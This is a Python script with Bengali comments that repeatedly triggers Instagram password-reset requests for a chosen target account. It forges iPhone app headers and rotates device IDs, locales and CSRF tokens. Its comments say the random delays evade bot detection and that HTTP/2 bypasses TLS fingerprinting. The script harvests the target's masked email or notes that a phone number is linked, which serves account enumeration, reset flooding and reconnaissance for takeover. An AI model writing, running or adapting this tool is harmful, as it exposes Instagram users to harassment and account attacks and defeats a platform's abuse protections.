import random
import re
import httpx
import uuid
import time

# 🚨 ট্রিক: প্রতিবার নতুন iPhone মডেল ও iOS ভার্সন তৈরি হবে
IOS_VERSIONS = ["16.1", "16.6", "17.0", "17.2", "17.4", "17.5"]
DEVICES = [
    ("iPhone14,2", "iPhone 13 Pro"), ("iPhone15,2", "iPhone 14 Pro"),
    ("iPhone16,1", "iPhone 15 Pro"), ("iPhone16,2", "iPhone 15 Pro Max")
]
LOCALES = ["en-US,en;q=0.9", "tr-TR,tr;q=0.9", "en-GB,en;q=0.9", "id-ID,id;q=0.9"]

def get_advanced_headers():
    ios = random.choice(IOS_VERSIONS)
    dev_id, dev_name = random.choice(DEVICES)
    locale = random.choice(LOCALES)
    csrf = str(uuid.uuid4())
    
    # আসল ইনস্টাগ্রাম মোবাইল অ্যাপের হেডার্স
    ua = f"Instagram 312.0.0.34.114 (iPhone; iOS {ios}; {locale}; {dev_name}; {dev_id})"
    
    return {
        "User-Agent": ua,
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "1",
        "x-requested-with": "XMLHttpRequest",
        "x-csrftoken": csrf,
        "x-device-id": ''.join(random.choices('0123456789abcdef', k=16)),
        "accept-language": locale,
        "content-type": "application/x-www-form-urlencoded",
        "Cookie": f"csrftoken={csrf}; ig_did={str(uuid.uuid4()).upper()};"
    }

URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"

def send_reset(target):
    # 🚨 ট্রিক: র‍্যান্ডম স্লিপ (বট ডিটেকশন এড়াতে ২-৪ সেকেন্ড দেরি হবে)
    time.sleep(random.uniform(2.0, 4.0))
    
    payload = {
        "email_or_username": target, 
        "flow": "fxcal",
        "recaptcha_challenge_field": "",
        "recaptcha_response_field": "manual_challenge"
    }

    try:
        # http2=True ব্যবহার করা হয়েছে যাতে TLS ফিঙ্গারপ্রিন্ট বাইপাস হয়
        with httpx.Client(http2=True, headers=get_advanced_headers(), timeout=25.0) as client:
            o = client.post(URL, data=payload)
            c = o.text
            
            # ইমেইল খোঁজা (Masked Email)
            ev = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', c)
            
            if ev:
                return f"email:{ev.group(0)}"
            elif "+" in c.lower():
                return "phone"
            elif "fail" in c.lower() or "no user found" in c.lower():
                return "error:not_found"
            elif "rate limit" in c.lower() or o.status_code == 429:
                return "error:rate_limited"
            else:
                # যদি কোনো এরর না আসে, ধরে নেওয়া হবে মেইল সেন্ট হয়েছে
                return "phone"
                
    except Exception as e:
        return f"error:{type(e).__name__}"
